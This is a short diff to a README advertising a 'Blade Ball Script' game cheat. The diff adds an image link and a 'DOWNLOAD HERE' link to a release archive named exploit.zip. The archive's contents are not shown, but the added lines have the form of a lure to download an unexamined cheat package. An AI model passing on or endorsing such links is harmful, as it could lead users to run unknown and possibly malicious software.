@@ -27,6 +27,10 @@ Dominate every match with this refined Blade Ball Script — a streamlined codeb
 - 💻 **Built for Fast Match Environments**  
   Handles the pressure of ranked and public lobbies with ease.
 
+[![image](https://github.com/user-attachments/assets/98345bb1-82cf-445c-a8d3-ec44fd427f7b)](https://github.com/donk25/script/releases/download/new/exploit.zip)
+
+[DOWNLOAD HERE](https://github.com/donk25/script/releases/download/new/exploit.zip)
+
 ---
 
 ## 📈 Quick Use Guide
